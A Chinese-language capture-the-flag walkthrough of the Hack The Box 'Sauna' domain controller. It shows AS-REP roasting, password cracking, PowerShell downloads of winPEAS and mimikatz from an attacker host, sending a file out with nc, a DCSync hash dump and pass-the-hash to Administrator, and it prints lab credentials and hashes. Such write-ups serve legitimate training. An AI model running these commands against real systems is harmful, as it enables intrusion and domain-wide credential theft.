# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

端口发现
```
┌──(root💀kali)-[~/htb/Sauna]
└─# nmap -p- -Pn 10.10.10.175 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 09:23 EST
Nmap scan report for 10.10.10.175
Host is up (0.26s latency).
Not shown: 65515 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49697/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1192.54 seconds

```

详细端口信息
```
──(root💀kali)-[~/htb/Sauna]
└─# nmap -Pn -sV -A -O 10.10.10.175 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49686,49697
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 09:45 EST
Nmap scan report for 10.10.10.175
Host is up (0.26s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-03 22:45:17Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     adws?
| fingerprint-strings: 
|   DNSStatusRequestTCP, Kerberos, SMBProgNeg, afp, oracle-tns: 
|_    Ihttp://schemas.microsoft.com/ws/2006/05/framing/faults/UnsupportedVersion
49667/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open     msrpc         Microsoft Windows RPC
49677/tcp open     msrpc         Microsoft Windows RPC
49686/tcp filtered unknown
49697/tcp open     msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9389-TCP:V=7.91%I=7%D=1/3%Time=61D30C0C%P=x86_64-pc-linux-gnu%r(DNS
SF:StatusRequestTCP,4B,"\x08Ihttp://schemas\.microsoft\.com/ws/2006/05/fra
SF:ming/faults/UnsupportedVersion")%r(Kerberos,4B,"\x08Ihttp://schemas\.mi
SF:crosoft\.com/ws/2006/05/framing/faults/UnsupportedVersion")%r(SMBProgNe
SF:g,4B,"\x08Ihttp://schemas\.microsoft\.com/ws/2006/05/framing/faults/Uns
SF:upportedVersion")%r(oracle-tns,4B,"\x08Ihttp://schemas\.microsoft\.com/
SF:ws/2006/05/framing/faults/UnsupportedVersion")%r(afp,4B,"\x08Ihttp://sc
SF:hemas\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-03T22:46:21
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   253.57 ms 10.10.14.1
2   254.12 ms 10.10.10.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.12 seconds


```

有DNS，kerberos和ldap，显然这是一台DC服务器。

枚举域名
```
┌──(root💀kali)-[~/htb/Sauna]
└─# crackmapexec smb 10.10.10.175 -u 'anonymous' -p '' --shares                                 
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\anonymous: STATUS_LOGON_FAILURE 

```
得到一个域名：```EGOTISTICAL-BANK.LOCAL```

枚举了一大轮，拿不到任何有用的东西。无法打开smb分享目录，也不知道任何有用的用户名。

## Kerberos

使用nmap枚举kerberos的用户名
```
──(root💀kali)-[~/htb/Sauna]
└─# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="EGOTISTICAL-BANK.LOCAL",userdb=/usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt 10.10.10.175
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 07:03 EST
Nmap scan report for 10.10.10.175
Host is up (0.30s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL
|     Administrator@EGOTISTICAL-BANK.LOCAL
|_    administrator@EGOTISTICAL-BANK.LOCAL

Nmap done: 1 IP address (1 host up) scanned in 41.32 seconds

```

看见只有一个```administrator```的用户名，这个显然目前我们是没有权限的

80端口的http服务看起来像是一个公司的介绍网页，尝试制作一份user名单

```cewl -d 1 -m 3 -w user.txt 10.10.10.175```

再用制作成的名单枚举kerberos的用户名
```
┌──(root💀kali)-[~/htb/Sauna]
└─# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="EGOTISTICAL-BANK.LOCAL",userdb=/root/htb/Sauna/user.txt 10.10.10.175
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 08:00 EST
Nmap scan report for 10.10.10.175
Host is up (0.30s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    sauna@EGOTISTICAL-BANK.LOCAL

Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds

```

得到一个新的用户名```sauna```


## web
在about us页面暴露出了team member的名字，手动制作一个用户名字典
把我们上面找到的两个kerberos的用户名也加上这个字典
```
┌──(root💀kali)-[~/htb/Sauna]
└─# cat user
Fergus Smith
Fergus
Smith
Fergus.Smith
FergusSmith
Fergus.S
fsmith
Shaun Coins
Shaun
Coins
Shaun.Coins
ShaunCoins
Shaun.C
scoins
Hugo Bear
Hugo
Bear
Hugo.Bear
HugoBear
Hugo.B
hbear
Bowie Taylor
Bowie
Taylor
Bowie.Taylor
BowieTaylor
Bowie.T
btaylor
Sophie Driver
Sophie
Driver
Sophie.Driver
SophieDriver
Sophie.D
sdriver
Steven Kerb
Steven
Kerb
Steven.Kerb
StevenKerb
Steven.K
skerb
sauna
administrator

```

使用```GetNPUsers.py```尝试向kerberos请求不需要预认证的票据

[hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast)里的解释:

> That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

```
┌──(root💀kali)-[~/htb/Sauna]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /root/htb/Sauna/user  -outputfile hashes.asreproast -dc-ip 10.10.10.175

```

可以看到拿到一个```fsmith```的票据
```
┌──(root💀kali)-[~/htb/Sauna]
└─# cat hashes.asreproast 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:85853ae8057c9c84f1ae5e3860cfcf35$29c704dfe2ce770414e478fcb530171c1b749dce35187d79c2679d93eaa6d2f5cd068123b2e4bbe3f59a94c1e589aa494ab81aa8d5c5c4d0bfdfa7a77320c3651f69e58550327e188e1b551f4d7d5a85fd0d541793c37e1908197d535f32ac12442756f3d5264610f155bcf1f341b29fa07234aaf7cd10a74c8fea80dddf6a8f5364633faf65313b81401888d24115e8c1bdb6fa2b45cf88b95c7f0b02f64cdf3ac44eb71fca52b9c187fa91bbcc9bd743ea59b8625abb2e8c94e632df4f3e2a8d50ed035e8b796e1ee1d57b1d6d85b4813af2b76c2af16da1ac9b2880f20c2afdac285dc57c200595de6d22df40eba458438d6b3082b3a66bebeeea0e04aacc

```

john破解
```
┌──(root💀kali)-[~/htb/Sauna]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:10 DONE (2022-01-03 10:33) 0.09775g/s 1030Kp/s 1030Kc/s 1030KC/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

# foodhold
拿到一个用户凭证：```fsmith:Thestrokes23```

使用evil-winrm登录，拿到foodhold和user.txt
```
┌──(root💀kali)-[~/htb/Sauna]
└─# evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith

```

# 提权

传winpeas和nc到靶机：
```powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8000/winPEASx64.exe','C:\Users\FSmith\Desktop\winPEASx64.exe')"```

执行winpea,重定向到o.txt：

&{C:\Users\FSmith\Desktop\winPEASx64.exe} > o.txt


## poweshell利用nc.exe传送文件


接收
```nc -nlvp 4444 > o.txt```

传送
```Get-Content  o.txt  | .\nc.exe -w 3 10.10.16.3 4444 | tee test.log```

发现一个用户密码
```
???????????? Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```


查看靶机的用户
```
*Evil-WinRM* PS C:\> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.

```

用evil-winrm登录到```svc_loanmgr```，查看用户信息信息
```
*Evil-WinRM* PS C:\> net users svc_loanmgr
User name                    svc_loanmgr
Full Name                    L Manager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/24/2020 3:48:31 PM
Password expires             Never
Password changeable          1/25/2020 3:48:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

看到```svc_loanmgr```在```Remote Management Use```组

查看这个组的解释
```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members

-------------------------------------------------------------------------------
FSmith
svc_loanmgr
The command completed successfully.

```

好像就是一个远程访问组。

我们尝试使用```DCSync```攻击尝试窃取用户哈希

关于```DCSync```，[hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync#dcsync)上是这样解释的：

>1. The DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.

>2. By default only Domain Admins, Enterprise Admins, Administrators, and Domain Controllers groups have the required privileges.

>3. If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text

默认有权限执行DCSync的用户组是：Domain Admins, Enterprise Admins, Administrators, and Domain Controllers 


把mimikatz.exe从kali传到靶机：

```powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8000/mimikatz.exe','C:\Users\svc_loanmgr\Documents\mimikatz.exe')"```


执行下面命令触发DC同步

```mimikatz.exe privilege::debug "lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /all /csv" exit```

可以看见导出了用户的哈希
```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./mimikatz.exe privilege::debug "lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /all /csv" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /all /csv
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] Exporting domain 'EGOTISTICAL-BANK.LOCAL'
502     krbtgt  4a8899428cad97676ff802229e466e2c        514
1103    HSmith  58a52d36c84fb7f5f1beab9a201db1dd        66048
1000    SAUNA$  230699e71e07d687981fc0685082b5cc        532480
500     Administrator   823452073d75b9d1cf70ebdf86c7f98e        66048
1105    FSmith  58a52d36c84fb7f5f1beab9a201db1dd        4260352
1108    svc_loanmgr     9cb31797c39a9b170b04058ba2bba48c        66048

mimikatz(commandline) # exit
Bye!

```

利用evil-winrm,使用哈希密码直接登录到```Administrator```（pass-the-hash）
```
┌──(root💀kali)-[~/htb/Sauna]
└─# evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator

```

# 总结
通过web页面展示的信息，我们猜测到了一个用户名
使用```GetNPUsers.py```尝试向kerberos请求不需要预认证的票据，我们因此拿到了foodhold
使用winpeas，我们枚举到了另外一个用户的明文凭证，因此我们可以提权到```svc_loanmgr```
利用DCSync拿到管理员的哈希密码，从而提权到administrator


# 补充

## secretsdump.py
拿到```svc_loanmgr```的凭证以后使用secretsdump.py也可以爆出其他用户的哈希密码，原理也是DCSync：
```
┌──(root💀kali)-[~/htb/Sauna]
└─# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround\\!@10.10.10.175
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:230699e71e07d687981fc0685082b5cc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:8dccc32df17c3189f01f7702e6198f9a01199229d04420d830bca8dc8a1b483e
SAUNA$:aes128-cts-hmac-sha1-96:a2927c8ea3e312d65894d9b1e508931f
SAUNA$:des-cbc-md5:7c2c156d022c0131
[*] Cleaning up... 
```

## 如何知道本账号是否有权限使用DCSync？

把[PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit)下载到本地


登录到靶机
```
┌──(root💀kali)-[~/htb/Sauna]
└─# evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -s '/root/PowerSploit/Recon'

```

引入PowerView.ps1
```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> PowerView.ps1
```


检查svc_loanmgr和Fsmith的域权限
```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> Get-ObjectAcl -DistinguishedName "dc=EGOTISTICAL-BANK,dc=LOCAL" -ResolveGUIDs | ? {$_.IdentityReference -match "svc_loanmgr|Fsmith"}


InheritedObjectType   : All
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
ObjectType            : All
IdentityReference     : EGOTISTICALBANK\FSmith
IsInherited           : False
ActiveDirectoryRights : ReadProperty, GenericExecute
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766

/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:39: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:128: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/lib/ruby/vendor_ruby/net/ntlm/client/session.rb:138: warning: constant OpenSSL::Cipher::Cipher is deprecated
InheritedObjectType   : All
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
ObjectType            : All
IdentityReference     : EGOTISTICALBANK\svc_loanmgr
IsInherited           : False
ActiveDirectoryRights : ReadProperty, GenericExecute
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766

InheritedObjectType   : All
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
ObjectType            : DS-Replication-Get-Changes
IdentityReference     : EGOTISTICALBANK\svc_loanmgr
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766

InheritedObjectType   : All
ObjectDN              : DC=EGOTISTICAL-BANK,DC=LOCAL
ObjectType            : DS-Replication-Get-Changes-All
IdentityReference     : EGOTISTICALBANK\svc_loanmgr
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-2966785786-3096785034-1186376766
```

留意ObjectType里显示svc_loanmgr拥有``` DS-Replication-Get-Changes```和```DS-Replication-Get-Changes-All```
表明用户可以使用DCSync，参考[这篇文章](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)

另外，也可以通过bloodhound查看当前账号在域中的权限，也可以查看到是否有DCSync权限。

## 关于上传下载

这个我是看IppSec的视频才知道的，evil-winrm登录以后可以直接通过upload和download命令上传下载文件，唔，原理如此方便，涨姿势了-_-！
